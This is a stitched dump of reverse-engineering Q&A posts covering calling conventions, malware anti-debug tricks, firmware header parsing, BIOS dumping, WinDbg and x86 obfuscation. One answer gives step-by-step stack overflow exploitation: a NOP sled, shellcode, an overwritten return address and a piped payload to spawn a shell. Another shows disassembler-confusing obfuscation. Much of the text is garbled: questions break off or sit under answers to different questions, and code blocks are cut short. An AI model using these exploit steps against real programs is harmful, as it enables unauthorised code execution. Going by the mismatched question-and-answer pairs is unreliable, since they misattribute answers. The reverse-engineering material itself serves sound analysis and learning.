   lea esi, [ebp-0xC] ; set param 1 for call to FOO
   call FOO
   test eax, eax ; test return value
   jz somelabel
</code></pre>

<p>The function FOO starts like this:</p>

<pre><code>   FOO:
   mov edi, edi
   push ebx
   xor ebx, ebx
   push ebx ; null
   push esi ; pass ESI in as second param to upcoming call, which has been set by caller
   push ptr blah
   mov [esi+0x8], ebx
   mov [esi+0x4], ebx
   mov [esi], ebx
   call InterlockedCompareExchange ; known stdcall func which takes 3 params
   test eax, eax
   ...
</code></pre>

<p>as ESI is not initialized in the body of FOO, I have assumed it is passed in as a param by the caller.</p>

<p>What is this calling convention? It looks to be a variant of fastcall. Is there a name for this convention?</p>
","<p>There is no ""official"" calling convention that works like that. What you're seeing is most likely the result of <a href=""http://msdn.microsoft.com/en-us/magazine/cc301698.aspx"">Link-time Code Generation</a>, also known as LTO (Link-time optimization) or WPO (<a href=""http://msdn.microsoft.com/en-us//library/0zza0de8.aspx"">Whole program optimization</a>).</p>

<p>When it is enabled, the optimization and code generation is done at link time, when the compiler has access to the code of whole program and all compile units, and can use this information for the more extreme optimizations.</p>

<p>From <a href=""http://msdn.microsoft.com/en-us/library/xbf3tbeh.aspx"">MSDN</a>:</p>

<blockquote>
  <p>When /LTCG is used to link modules compiled by using /Og, /O1, /O2, or
  /Ox, the following optimizations are performed: </p>
  
  <ul>
  <li><p>Cross-module inlining</p></li>
  <li><p>Interprocedural register allocation (64-bit operating systems only)</p></li>
  <li><p><strong>Custom calling convention</strong> (x86 only)</p></li>
  <li><p>Small TLS displacement (x86 only)</p></li>
  <li><p>Stack double alignment (x86 only)</p></li>
  <li><p>Improved memory disambiguation (better interference information for global variables and input parameters)</p></li>
  </ul>
</blockquote>

<p>In the code snippet you quoted the compiler detected that the function <code>FOO</code> is not called from outside of the program, so it could customize the calling convention to something that uses register values already set up at the place of call, or otherwise improve register allocation. With heavily templated code you can even get several copies of often-used functions that accept arguments in different sets of registers and/or stack.</p>

"How to handle exceptions in a debugger when reversing malware?","1556","","<p>I came across some malware that raised an exception while I was single stepping through it. IDA gives me the option to pass the exception to the application or not. What exactly is going on here? When would I not want to pass the exception to the application?</p>
","<p>Often times malware and/or obfuscated code (such as unpacking stubs) will do something such as the following:</p>

<ol>
<li>Set up an exception handler.</li>
<li>Throw an exception.</li>
<li>See if the exception handler caught the exception.</li>
</ol>

<p>If the exception handler didn't catch the exception then the debugged code knows that a debugger was attached and ""swallowed"" the exception, thus indicating that the code is being debugged. In order to hide your debugger from such detection techniques, you always want to pass exceptions to the application when dealing with malware and/or obfuscated code.</p>

"Rebuild symbol table","1548","","<p>I would like to load a function I have decompiled in IDA Pro.  All I have is the IDA Pro function name <code>sub_xxxx()</code> and obviously the address.  I had thought about using <code>dlopen</code> to load the binary but obviously I don't have a symbol to load as the binary has been stripped.  Could I somehow call the function without a symbol table?  Or do I have to rebuild the symbol table of the binary to then use <code>dlsym</code> to locate and load the symbol?</p>
","<p>You can call a function at any address. So, load the dynamic library into your process address space, figure out the base of the newly loaded library and take the offset from the base of the library of the function you wan't to call and add that together. </p>

<p>So if IDA says the base of the binary is <code>0x4000</code> and your function is at address <code>0x4100</code>, then you have an offset of <code>0x100</code>. Then if you load your library it winds up getting loaded at address <code>0x8000</code>, you make a function pointer (with the correct signature of course) pointing at address <code>0x8000 + 0x100</code> and call it. Depending on your platform the base you get for your dynamic library from the platform loader may be further offset from the actual base IDA shows.</p>

<p>Another option is of course to add a new export definition for your <code>sub_xxx()</code> function to the dynamic library and having the loader actually handle any relocations. It will be far more reliable, will allow you to name the function something sane so that you can handle future updates to the library where the function address changes simply by re-adding your new export to the new version. Use something like <a href=""http://www.zynamics.com/bindiff.html"" rel=""nofollow"">BinDiff</a> to find the new location of the function.</p>

<p>The third popular option is to use something similar to <a href=""https://www.hex-rays.com/products/ida/tech/flirt/in_depth.shtml"" rel=""nofollow"">IDAs FLIRT</a> signatures in order to scan the loaded dynamic library for the function directly in memory. It's generally called signature scanning and <a href=""https://wiki.alliedmods.net/Signature_Scanning"" rel=""nofollow"">here's a more thorough explanation</a> of the concept on the Windows platform. Very simplified it's a technique for finding a function based off of pattern extracted from the function prologue.</p>

<p>In your case you control the application from what I can see and want to call into a dynamic library you don't have the source for. In that case I would probably go with the second option or the first one if you know that the library will never change.</p>

"Ripping/pasting code into an executable using Olly","1534","","<p>I'm working with some x86 assembly code and I need to rip from one executable and paste that code into another.</p>

<p>Originally, I had an executable that was meant to accept two command line parameters and run a handwritten function on them. However, I ran into annoyances with using GetCommandLine et al to return the parameters in my ASM. Namely it returned Unicode and I needed the parameters in ANSI. Rather than dealing with setting up the library calls and converting that way I compiled a small program that uses command line arguments with the intent of reusing code.</p>

<p>So now I have two executables:
- one with the command line parameters parsed and in their proper places
- two with the actual assembled function code inside of it.</p>

<p>The first executable has the space for the function NOP'd out but I need a good way to paste the logic in. I've looked at Asm2clipboard, Code Ripper and data ripper but they only have the functionality to rip the assembly out, but not paste it back in.</p>

<p>I'm aware I'll have to fix addresses and things like that but I can't find a way in Olly or other tools to move the code between the executables. I can go into HexEdit or something like that I supposed but I was hoping there's an easier way.</p>

<p>So where can be the <strong>Assembly-CSharp.dll</strong> decrypted at runtime?
Or is there another way without decrypting that at runtime?</p>
","<p>Mono is, basically, open source. So anyone can create a Mono implementation that, whenever it reads a chunk of a CIL DLL file, applies encryption to it. Maybe Unity delivers a libmono.so that does encryption with its newest version; maybe the vendor of the game implemented something themselves. You could start checking patch notes of Unity to learn if this is an official new feature; if not, it's likely that the game vendor created their own encrypting libmono.so.</p>

<p>Your TEA functions are, most likely, called within the libmono.so itself. If i had to implement something like that, i'd write wrapper functions <code>TEAopen</code>, <code>TEAread</code>, <code>TEAclose</code> for <code>fopen</code>, <code>fread</code>, <code>fclose</code> that decrypt on reading the file, then replace the <code>f-*</code> functions in the mono-code that reads a DLL with the <code>TEA-*</code> functions.</p>

<p>TEA encryption works with 8-byte chunks, which may be one of the reasons it was used here; if you want to read just a part of the file, you don't need to read everything before your part, except a few bytes to fill the 8-byte-block. But this also means the same 8 input bytes will always result in the same 8 output bytes, if your original DLL has areas with a lot of '\0' bytes, they will result in the same 8 bytes repeated over and over in the encrypted DLL.</p>

<p>While <a href=""http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.40.4708&amp;rep=rep1&amp;type=pdf"" rel=""nofollow"">TEA has a weakness that turns a 128 bit key into 126 effective bits, there seems to be no known plaintext attack on it</a>. This means, your observed same change pattern won't help you. So you need to extract the key from the mono implementation yourself. Disassemble that file, especially the <code>TEAEncrypt</code> and <code>TEADecrypt</code> functions. They should look somewhat like the code from the <a href=""https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm"" rel=""nofollow"">Wikipedia article</a>. Their second parameter is the key; either try to find out where that key is stored/generated, or do some dynamic analysis, put a breakpoint on those functions, and check what the parameter they get actually is. Also, check if it's really a standard TEA implementation, or maybe XTEA or a different key schedule constant or something. Once you have the key, find a program that takes a file and a TEA key and decrypts it, or roll your own; this shouldn't be too difficult as there are lots of open source TEA implementations in any language of your choice.</p>

"Converting hex value to lat/long","1512","","<p>Sorry if this is the wrong place to ask this but I'm stumped. I'm looking at iOS code as follows. </p>

<pre><code>- (NSString *)currentE6Location {
    CLLocationCoordinate2D loc = [AppDelegate instance].mapView.centerCoordinate;
    return [NSString stringWithFormat:@""%08x,%08x"", (int)(loc.latitude*1E6), (int)(loc.longitude*1E6)];
}
</code></pre>

<p>So it's pretty simple.. From my understanding is they are taking a lat/lon and changing it from a float to an int then converting the int to a hex that is 0 padded in the front. So the hex value is 8 chars in length. The issue I'm having is do the same thing in python..</p>

<p>So the iOS app sends hex values like</p>

<pre><code>36.968772,-122.013498   ""0234194f,f8ba38ae""
</code></pre>

<p>The first set are lat/long and the 2nd are roughly their hex values</p>

<p>The lat works just fine</p>

<pre><code>0234194f = 36968783
</code></pre>

<p>So 
    36968783 / 1e6 = 36.968783 (like I said its a rough estimate between the two)</p>

<p>But the 2nd one is odd</p>

<pre><code>f8ba38ae = 4172953774
</code></pre>

<p>The seem to use a 4 there if it's a - value for lon since you can't have a negative int has a hex value. So dropping the 4</p>

<pre><code>172953774 / 1e6 = 172.953774 (so knowing the 4 is there it would be -172.953774)
</code></pre>

<p>So I'm a bit stumped on why it works fine for the lat but not the lon..</p>

<p>Again sorry if this is the wrong site for this.. please close if it is. </p>
","<p>I'm not sure that this is the right place -- StackOverflow would have been a fine place to ask -- but I'll answer anyway. Essentially the issue is that <code>%x</code> treats the argument as an unsigned int. So the value <code>f8ba38ae</code> is the two's complement representation of the original signed int.</p>

<p>You can convert it back easily, though, for example with this Python snippet:</p>

<pre><code>&gt;&gt;&gt; import struct

"How to obfuscate x86 assembly code?","1495","","<p>For my project, I am performing a kind of checksum operation on a portion of code to protect it and therefore do not want its template to be easily visible and therefore need obfuscation.</p>

<p>I have searched a lot on the net and read papers describing obfuscation definitions, types, etc. But there seems to be no tutorial on obfuscating x86 assembly code. Can anybody suggest a simple algorithm/tool for the same?</p>

<p>I have read about inserting dummy code, changing the order of the instructions and other techniques but they appear to be totally random i.e. there is no end to how much dummy code to insert, etc.</p>

<p>Can somebody at least guide me to the correct approach? </p>
","<p>You should not confuse ""code protection"" and ""code obfuscation"". ""Code protection"" techniques target in recognizing code modifications (you mention a checksum) and take suitable means like crashing or delivering wrong results when tampering with the code has been recognized. Anti-Debug measures also belong into this category.</p>

<p>""Code obfuscation"" in a binary targets in blinding the investigator (and the disassembler) with awkward and often useless code, ranging from simple jmp chains to more complicated constructs. Most code obfuscation techniques result in some code bloat, and the tradeoff between the obfuscation and the performance must be considered. Here are two obfuscation examples being found ""in the wild"".</p>

<ul>
<li>Dummy code: There are many means to insert nops in binaries. Examples range from simple statemens like shr eax, 0 or (in the 32-bit world) shl bx, 20h to more complicated constructions like the following example. The combination of jz and jnz followed by garbage statements (cpuid, ret), avoiding a jmp often confuses disassemblers in their ability to display logical assembly blocks.</li>
</ul>

<p><code>
    mov si, si
    mov esp, ebp
    jnz loc_abcd
    xchg edi, esi
    mov cl, cl
    xchg esi, edi
    mov di, di
    jz loc_dcba ; followed by a jmp to loc_abcd
    cpuid
    ret
</code>
In the example, the only ""real"" statement is the mov esp, ebp.</p>

<ul>
<li>Complicate simple assembly constructs. You may write a simple jmp as a combination of a push and a ret. Or, if you don't like the ""ret"" statement, you may replace it by (in 64-bit code):
<code>
lea     rsp, [rsp+8]
jmp   qword ptr[rsp-8]
</code></li>
</ul>

<p>Many more, and much more complicated examples can be found. If you want to dive into this matter, you need practice, as in all SW reversing. Get a protected and/or obfuscated binary like a game or a dongle protector and train. In the literature (e.g. the excellent IdaPro book by Chris Eagle) you may find some obfuscation constructs as well.</p>

"Reverse Engineering MIPS Bootloader","1492","","<p>I am trying to figure out how the bootloader of a TP-Link wr702n device (based on an AP121 MIPS board) starts the operation system (VxWorks 5.5.1). The bootloader is extracted from a firmware update file and is a binary (no ELF, PE,...). I am stuck with the next step. IDA Pro disassembles some functions but (I guess) it needs further information about the ROM start address, loading address, and offset to do it properly. Where can I find these information?</p>

<p>I have no RE experience and I am doing this for fun/education. Any hints about further reading or next steps would be great.</p>
","<p>As you guessed correctly, you have to find out the correct starting address of the bootloader image. Based on the bootloader in the latest firmware image (TL-WR702N_V1_141203) I recommend you to try 0x80400000 as the start address.<p>
Although I don't know a simple and exact method to calculate the start address I try to explain a little bit more how can you found this anyway.<p>
You can try the following techniques:
<li>Identify function starts and pointers to the functions and try to match them. If you disassemble the whole binary, the function start addresses can be determined very accurately. So, you can collect the relative start addresses. In most of the binaries and bootloaders, after the code section you will find various data items such as pointers to functions. If you can identify some of these pointers, you can try to find the corresponding relative address.
<li>You can find hints from the code itself. Although the bootloader uses relative branches, the data items are accessed with absolute addresses. In the figure, you can find the absoulte addresses as 0x804B7F10 and so on.<br>
<a href=""https://i.stack.imgur.com/aLbuS.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/aLbuS.png"" alt=""enter image description here""></a>
<br>
Based on this address and the length of the code area (0x9B6A4) you may have intelligent guesses, such as 0x80400000 or 0x80408000 or similar.</p>

"How can BIOS routines be disassemblied?","1488","","<p>There was once a disassembler on DOS named <strong>Sourcer</strong> that can disassembly BIOS routines. However, how do we access to BIOS ROM from software to do such a thing?</p>
","<p>In the old days, you could usually dump the high part of the 1MB memory (e.g. E000:0000 to F000:FFFF) to retrieve the copy of your BIOS ROM, but nowadays the BIOS no longer fits into 64K or even 128K so all that you'd get would be a copy of the UEFI's CSM (Compatibility Support Module) with most of the code elsewhere, usually above the 1MB mark. </p>

<p>To retrieve the actual, full BIOS code, you need to read the ROM from the flash chip. This may be possible from the same machine, e.g. by using <a href=""https://www.flashrom.org/"">flashrom</a> or sometimes the board vendor's firmware update tool if it offers a ""backup"" option. Sometimes the access to the flash may be blocked from the OS (to prevent BIOS modification by malware) and  in such cases you may have to use an external flash programmer.</p>

<p>Once you got the copy of the ROM, you can start disassembling it. However, keep in mind that modern BIOSes usually implement the UEFI standard, where only a small part of the code (around the reset vector) is 16-bit while most of the code runs in 32-bit (or 64-bit) protected mode, usually using modules implemented in the PE(Portable Executable) format. Since even the structure of the UEFI firmware's ROM is standardized, you can often use a tool such as <a href=""https://github.com/LongSoft/UEFITool"">UEFITool</a> to extract individual modules for analysis. For more info on UEFI, see the UEFI and PI standards, available for free from <a href=""http://www.uefi.org/specifications"">www.uefi.org</a>.</p>

"Syntax errors when decompiling with JD-GUI","1487","","<p>I am aware that when decompiling a jar file, it is normal for the resulting .java files to contain syntax errors, but I am unsure of why and worse off I am sometimes unsure of how to fix these syntax errors. Take <code>int[] arrayOfInt = new int['Â€'];</code>, for example. Eclipse complains that <code>'Â€'</code> does not belong. Surprise! I know this already, but why does this happen. How can I find out what this value should be?</p>
","<p>The reason it happens is because JD-Gui isn't encoding unicode properly. You can see that the thing inside the quotes is two bytes, and appears to be interpreted as nonstandard upper 128 characters. I.e. JD-Gui is emitting unicode, but the charset isn't declared correctly so your editor interprets it as two raw bytes in an 8bit charset instead of a single unicode character.</p>

<p>One solution is to use a Decompiler that emits unicode escapes instead of raw unicode byte sequences. That way, any editor will be able to view it correctly. I'd recommend Procyon (it's a lot better than JD-Gui anyway).</p>

"Find the kernel structure that contains device name","1482","","<p>I'm using WinDbg to try enumerate drivers and their associated devices. Getting the driver name is very easy. It is found in the <a href=""http://msdn.moonsols.com/win7rtm_x86/DRIVER_OBJECT.html"" rel=""nofollow"">_DRIVER_OBJECT</a> structure. Unfortunately, the <a href=""http://msdn.moonsols.com/win7rtm_x86/DEVICE_OBJECT.html"" rel=""nofollow"">_DEVICE_OBJECT</a> does not contain the name of the device. </p>

<p>Using the <code>!devobj</code> command I can see the name of the device, but I would like to find the table/structure that contains the name.</p>
","<p>So assuming like you said, you have the linear address of your device object, use the windbg extension <code>!object 0xlinearaddress</code>. Based on your windows build, it will display the linear address of the object header. Which in memory exists right below the object.</p>

<p>Use windbg to parse the <code>OBJECT_HEADER</code> structure for you. Starting with Windows 7 you are going to have a member called <code>InfoMask</code>, earlier versions have <code>NameInfoOffset</code>. </p>

<p>If you have an earlier build, <code>NameInfoOffset</code> is subtracted from the linear base of the object header, to get you the base of an <code>OBJECT_HEADER_NAME_INFO</code> structure for that object.</p>

<p>If you have a Windows 7 build or later, <code>InfoMask</code> is a bitmask describing other creator structures that exist before the beginning of the header. It is computed using the <code>ObInfoMaskToOffsetTable</code> which contains the offset to the <code>OBJECT_HEADER_NAME_INFO</code> structure for the object. It is always at a constant location but the <code>InfoMask</code> should be used to determine if the object is named, because not all objects are required to be named.</p>

<p>So a quick example for you, let's say you have a device object at <code>fffffa8001234560</code>. Let's also presume you are using Windows 7 x64.</p>

<p>Your name info would be:</p>

<pre><code>dt nt!_object_header_name_info fffffa8001234560-0x30-0x20
</code></pre>

<p>-0x30 to base of header
-0x20 because in this case <code>InfoMask</code> used in the table has an index value of 0x20.</p>

<p>This structure contains the name <strong>relative</strong> to it's object directory. </p>

"IDA Pro converting to instruction functionality: how to automate.","1447","","<p>I am loading various files that read into IDA as binary. Once I have the GUI in front of me I am able to go through the segments and hit ""c"" in order to convert to instruction/code.</p>

","<blockquote>
  <p>68 A bytes - 23 shellcode bytes: 45 NOPs.</p>
</blockquote>

<p>NOP is the mnemonic that stands for No OPeration which is the byte \x90, meaning that you'll have to change the A's (\x41) for NOPs (\x90), because \x41 by itself it's not a valid ASM instruction in the x86 processor hence making your program crash.</p>

<p>Taking this into account, first part goes like: </p>

<pre><code>python -c 'print ""\x90""*45' &gt; payload.bin
</code></pre>

<blockquote>
  <p>23 bytes Shellcode</p>
</blockquote>

<p>This is self explanatory, just add your shellcode:</p>

</code></pre>

<blockquote>
  <p>4 bytes for the EIP register, pointing the start of the shellcode.</p>

<h1>Here's the tricky part:</h1>

<p>First ask yourself a few questions:</p>

<ol>
<li>Does the system have ASLR enabled?</li>
<li>Does it have DEP enabled?</li>
<li>NX?</li>
</ol>

<p><a href=""https://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx"">Read this if the answer is that you don't know</a></p>

<p>And if the answer to both of these is <strong>no</strong> then, continue to check into gdb the following</p>

<ol>
<li><a href=""https://stackoverflow.com/questions/10483544/stopping-at-the-first-machine-code-instruction-in-gdb"">Set a breakpoint at program's entry point in gdb</a></li>
<li>Step in gdb until you get to the call to strcpy (id est, when the overflow happens)</li>
<li>Get the location of your <em>buf</em> variable in stack. We can do so by writing the next command in gdb since the Stack Pointer is pointing right at the beginning of <em>buf</em>

<ul>
<li><code>x/32xb $esp</code></li>
</ul></li>
</ol>

<p>Now that you have the location of your <em>buf</em> variable, which should be something in the form <code>0xbffff5f0</code>. Now get that memory position and add it to the end of your payload. You need this position in order to jump to the location of your <em>buf</em> variable and execute the shellcode in it...</p>

<h1>But hold on!</h1>

<p>You still have to take <a href=""https://en.wikipedia.org/wiki/Endianness"" rel=""nofollow noreferrer"">endianness</a> into account, which in your system is little endian.</p>

<p>So you'll need to write that memory position in little endian which, if you are lazy like me, you'll end up <a href=""https://github.com/n30m1nd/pyndianizer"" rel=""nofollow noreferrer"">writing a script that makes it for you</a>:</p>

<p><code>python pyndianizer.py 0xbffff5f0</code> ==> <code>\xf0\xf5\xff\xbf</code></p>

<p>Now, add it to your payload
<code>python -c 'print ""\xf0\xf5\xff\xbf""' &gt;&gt; payload.bin</code></p>

<h1>And for the grand finale:</h1>

<p><code>cat payload.bin | ./shell</code></p>

<p>If everything was done well, just press a few enters and you'll have your shell.</p>

<h1>Final note</h1>

<p><em>Your shellcode runs <code>/bin/sh</code> but just running it doesn't work sometimes because the program ends just after running your shellcode. If so, you'll have to make it wait for user input after <code>cat</code>ing the shellcode in</em></p>

"Format of .chk firmware package on WGR614v7","1438","","<p>Note: I'm aware of the technical and legal implications of reverse-enginneering binaries.</p>

<p>I have the firmware for a Netgear WGR614v7 router, in the form of a .chk file, coming from Netgear themselves, and I wish to unpack the file. My understanding is that a firmware .chk file is <a href=""http://www.dd-wrt.com/wiki/index.php/WGR614_v8"" rel=""nofollow"">a header</a> before a TRX image, and I've tried to untrx the ile I had sans header, or with header as well. Neither that nor <code>binwalk</code> succeeded. Two useful strings are seen very close to the beginning of the file:</p>

<ul>
<li>AH00I8</li>
<li>U12H064T00_NETGEAR</li>
</ul>

<p>Inspecting the file in a hex editor, I'm unable to find the <a href=""http://wiki.openwrt.org/doc/techref/header?s%5b%5d=trx"" rel=""nofollow"">TRX file signature</a> (I was looking for ASCII <code>HDR0</code>). I also cannot find any sort of compression magic values, except fairly far into the file where they're not likely to signify the beginning of the actual content I'm looking for. </p>

<p>Am I looking for the wrong filetypes? Is anything about this structure known that I haven't found yet?</p>

<p><strong>Edit:</strong> The firmware has been downloaded from <a href=""http://support.netgear.com/product/WGR614v7"" rel=""nofollow"">Netgear's site</a>. I tried chopping off various lengths but cannot find a reasonably-located compression or TRX header. The characteristic <code>ff ff ff ff</code> of IMG images used as a method of preventing a repetitive boot firmware is also not existent.</p>

<p><strong>Edit 2:</strong> I did some searching of my own, and found a <a href=""http://ttf.mine.nu/techdocs.htm"" rel=""nofollow"">decompression utility</a>. When I chopped the file such that <code>sqz</code> had been the first characters, that utility seemed to find valid Huffman structures but incur a size mismatch. A result of the decompression yielded 11 bytes, while the program warned me:</p>

<blockquote>
<pre><code>Warning: Unpacked file should be 7537274 bytes but is 396409921 bytes! at ./unpack.pl line 61, &lt;STDIN&gt; line 3.
</code></pre>
</blockquote>

<p>Of course, it could be that many kinds of data that is corrupt might be partially readable as huffman giving me strange results as seen here.</p>
","<p>The file begins:</p>

<pre><code>0000000: 4148 3030 4938 e66c 000e aa28 9835 0589  AH00I8.l...(.5..

0000030: 4152 0000                                AR..
</code></pre>

<p>The reason for picking this size will soon become clear.</p>

<p>The first four bytes (<code>AH00</code>) are probably file magic. Googling just that string brings up <a href=""http://www.0xf8.org/2009/07/hacking-the-netgear-wg102-access-point/"" rel=""nofollow"">this page</a>, which has a detailed breakdown of a different firmware file with a similar structure.</p>

<p>The next four bytes are not described by the linked page. Reading them as a 32-bit big-endian value (BE32), though, you get 0x4938e66c = 1228465772, which is plausibly a recent UNIX timestamp (usually values from around 800,000,000 to 1,500,000,000). Indeed, it decodes to <code>Fri Dec  5 08:29:32 2008 GMT</code>, which is plausibly the build date of the hardware (and I note that the linked article has 0x481ac265 = <code>Fri May  2 07:27:33 2008 GMT</code>, which also seems plausible).</p>

<p>The next four bytes read as a BE32 value give 961064. The total filesize is 961116 bytes, so this is likely the payload size, leaving 52 bytes for the header (and thus explaining why I chose to show the first 52 bytes here).</p>

<p>The next 32 bytes are the MD5 sum of the payload as indicated by the linked page. I deleted the first 52 bytes and MD5 summed the result:</p>

<pre><code>983505893004125a1b3965ff47e4b95c  /tmp/fw.sqz
</code></pre>

<p>which is exactly what the header contains.</p>

<p>The next two bytes are unknown.</p>

<p>The next two bytes are 0x0014, which is the length of the string that follows (including two padding NULs). While I'm not familiar with Netgear routers, I'm guessing this is a model/revision number for the hardware target.</p>

<p>And there you go: that's the <code>.chk</code> file header.</p>

<pre><code>char magic[4];
uint32_t timestamp; // UNIX timestamp
uint32_t payload_size;
char md5sum[32];
uint16_t unknown; // = 1 on all files seen so far
uint16_t model_size;
char model[model_size];
</code></pre>

<hr>

<p>In the original linked page, the payload was a plain ELF file. Unfortunately, in your firmware, the payload is some other kind of file, with the magic <code>sqz</code> (""squeeze""?). It's clearly compressed, but I can't tell what it's compressed with. For now, this will have to be an incomplete answer until someone figures out what the compression format is.</p>

  <p>The .imgscan command scans virtual memory for image headers.</p>
  
  <p>The .imgscan command displays any image headers that it finds and the header type. Header types include Portable Executable (PE) headers and Microsoft MS-DOS MZ headers.</p>
</blockquote>

<p>I was able to verify this in user mode, but with the only Windows XP kernel mode dump I currently have, it does not output anything.</p>

<p>Example output from a user mode dump:</p>

<pre><code>MZ at 000007fe`ff4d0000, prot 00000004, type 00020000 - size db000
  Name: ADVAPI32.dll
</code></pre>

<p>So all the necessary information to get the DLL is available. In case of a user mode dump I have used</p>

<pre><code>.writemem &lt;FileName&gt; &lt;Range&gt;
</code></pre>

<p>to write the DLL to disk and analyze later. This probably won't work for kernel mode dumps because parts of the module may have been swapped to disk, so the DLL in memory is no longer complete.</p>

<p>This approach will also not find code that was generated on the fly.</p>

<h2>Finding potentially executable code</h2>

<p>Code that can be executed must reside in a memory block that has the <code>executable</code> flag set.</p>

<p>Unfortunately the command</p>

<pre><code>!address -f:&lt;filter&gt;
</code></pre>

<p>is broken in WinDbg 6.2.9200. It should work in user mode dumps and output a list of start and end addresses that are executable.</p>

<p>At the moment I only get</p>

<pre><code>0:067&gt; !address -f:PAGE_EXECUTE

        BaseAddress      EndAddress+1        RegionSize     Type       State                 Protect             Usage

0:067&gt; !address -f:PAGE_EXECUTE_WRITECOPY

</code></pre>

<p>Although I have a full memory dump</p>

<pre><code>0:067&gt; .dumpdebug

                0002 MiniDumpWithFullMemory

"Is it possible to debug an ELF file with a Windows-based disassembler?","1423","","<p><strong>Problem :</strong> How can I debug an ELF file in MS Windows? is it possible?</p>

<p><strong>Scenario :</strong></p>

<p>I have an ELF file compiled to work on hardware with VXWorks 5.5 OS and SH4 CPU. IDA68 is able to disassemble the file and correctly detects SH4 instructions although looks like IDA is unable to debug it with its debugger(the debugger icon is grey), and without the ability to debug the assembly it is almost impossible to understand.</p>

<p>Am I missing something here?</p>
","<p>ELF files can be debugged using IDA debugger if you have the same CPU and OS that were used to build them, installed locally or have them in a remote machine.</p>

<p>In case you don't, you're still able to debug the file but only if the compiler have debugging data in  <a href=""https://en.m.wikipedia.org/wiki/DWARF"" rel=""nofollow noreferrer"">DWARF</a> standard included in the file.</p>

<p>Another option that SVS suggest me, is to set up an emulator with OS and Arctitecture you need trace the file over there which is a good practical way I believe.</p>

<p>Not all ELF files have DWARF debugging data. Particularly, those that are not suppose to be reverse engineered.</p>

","<p>UAC has certain heuristics that will cause a file to request elevation unless a manifest exists that states otherwise. Such heuristics include files that seem to be setup programs for some software. But there are more heuristics and other situations where elevation is assumed to be required.</p>

<p>If the executable has no manifest, you need to add one. Otherwise you may have to modify the existing one.</p>

"Setting an IDA function pointer in a struct via script","1402","","<p>The ordinary, manual way of redefining a <code>struct</code> member to become a function pointer would be to press on it, hit '<kbd>Y</kbd>', and enter the proper declaration in the popup box. For example, for <code>struct</code> member <code>fncQuery</code>, I would change the string to: <code>BOOL (__cdecl *fncQuery)(char *cmdID)</code></p>

<p>This would be helpful; When I next identify a call to this function pointer, I would mark the appropriate <code>call [reg+offset]</code> line as this function pointer, and IDA will re-analyze and comment the parameters for me.</p>

<p>I have a thousand <code>struct</code> each with at least one such function pointer member, and corresponding lists of the descriptions of these functions' parameters and return values. Understandably, I want to match them up by an IDAPython script rather than by hand. However, I can't find an equivalent for the '<kbd>Y</kbd>' button for scripts:</p>

<ul>
<li><p><code>AddStrucMember</code> does not cut it as far as I know - I can declare a member to become a pointer to a <code>struct</code> by giving it a <code>structID</code>, but that's not what I need.</p></li>
<li><p><code>SetMemberType</code> is the same as the previous.</p></li>
<li><p><code>SetType</code> requires a linear address and a type string - which would be perfect except linear addresses are exclusive to the code section, so I can't touch structure member definitions with <code>SetType</code>.</p></li>

Specifically, such horrible calls are seen (taken out of context of its definitions, you'll have to trust me when I say this runs properly and the first function call fills up its many outparameters with meaningful values):</p>

<p>As far as I understand it is that the <code>0x3FFFFFFF</code> has something to do with the bounds of the array?</p>

<p>I think after the DisconnectUser and free of memory all the playerPointer pointers get shifted to the left is that correct? or it just changes the counter in different paths.</p>

<p>I think the counter is either <code>v3</code> can keep increasing while the loop is going but when a player gets removed it starts checking from the end of the list or something?</p>
","<p>I think it should look like this I am 99.9% feel it's a element shifter something tells me that <code>0x3FFFFFFF</code> is max bounds of a array so it's some compiler thing that it appends to make sure it gets the end of the array.</p>

<p>I was wrong <code>0x3FFFFFFF</code> is used to create signed numbers to emulate subtracting by adding. See comment by DCoder</p>

<pre><code>  if ( ZonePlayerCount &gt; 0 )
  {
    v3 = 0;

    do
    {
      if ( playerPointerList[v3].IPAddressDWORD.S_un.S_un_b.s_b1 == IPAddress &amp;&amp; playerPointerList[v3].Port == Port )
      {
        printf(""Connection is broken because same ip/port requested another connection\n"");

        Memory = *v5;
        if ( *v5 )
        {
          DisconnectUser(*v5);
          free(Memory);
        }

        memcpy(&amp;playerPointerList[v3], &amp;playerPointerList[v3 + 1], 4 * (ZonePlayerCount - v3 - 1));
        //or
        memmove(&amp;playerPointerList[v3], &amp;playerPointerList[v3 + 1], (ZonePlayerCount - v3 - 1) * sizeof(&amp;playerPointerList));

</code></pre>

<p>Let me know if this is wrong, I'll remove the answer. (don't have original source code to compare against).</p>

<p>Thought I shouldn't be using <code>memcpy</code> because it may leave junk in memory at the very end but i think that junk does no harm and eventually will be replaced with something useful when the time comes.</p>

<p>Although it does seem <code>memmove()</code> is better suited here.</p>

"Reversing a Windows service","1395","","<p>I am trying to reverse engineer a malware that open a windows service dynamically in OllyDbg.

<p>How I can continue to analyze this malware dynamically?</p>

<p>Note: I already used <code>Image File Execution Options</code></p>
","<p>If you want to debug the service initialization and it happens automatically (not triggered by some action you perform), you probably can't do it on any Windows newer than XP with ollydbg. You'll have to use WinDbg.</p>

<p>You need to set IFEO Debugger for your process name to run CDB <strong>as server</strong> (e.g. <code>cdb.exe -server tcp:port=12345 -noio</code>) and the run WinDbg as a client and connect to your server (<code>windbg.exe -remote tcp:server=localhost,port=12345</code>).</p>

<p>You'll probably want to change the <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ServicesPipeTimeout</code> Registry value to be a bit longer. This is the time the SCM waits for a service it runs to talk to it.</p>

<p>If you don't have to debug the initialization you can simply attach to the service after it starts, and then you can use ollydbg.</p>

<p>All of this and pretty much everything you need to know is documented under the MSDN page titled <a href=""https://msdn.microsoft.com/en-us/library/windows/hardware/ff540613(v=vs.85).aspx"" rel=""nofollow noreferrer"">Debugging a Service Application</a>.</p>

<p><em>Edit:</em> If patching the binary is possible you can add an infinite loop in the entry point like <a href=""https://reverseengineering.stackexchange.com/users/1876/gandolf"">gandolf</a> suggested and then attach a debugger after you log in.</p>

<p>Or, if the binary doesn't do any SEH tricks that interfere with it: Add an exception to the entry point (0xCC - int 3 is the obvious choice), set <code>AeDebug</code> to a long running process (such as <code>notepad.exe</code>) and then attach a debugger. This is what <a href=""http://rads.stackoverflow.com/amzn/click/0735662789"" rel=""nofollow noreferrer"">Inside Windows Debugging</a> proposes (p. 139).</p>

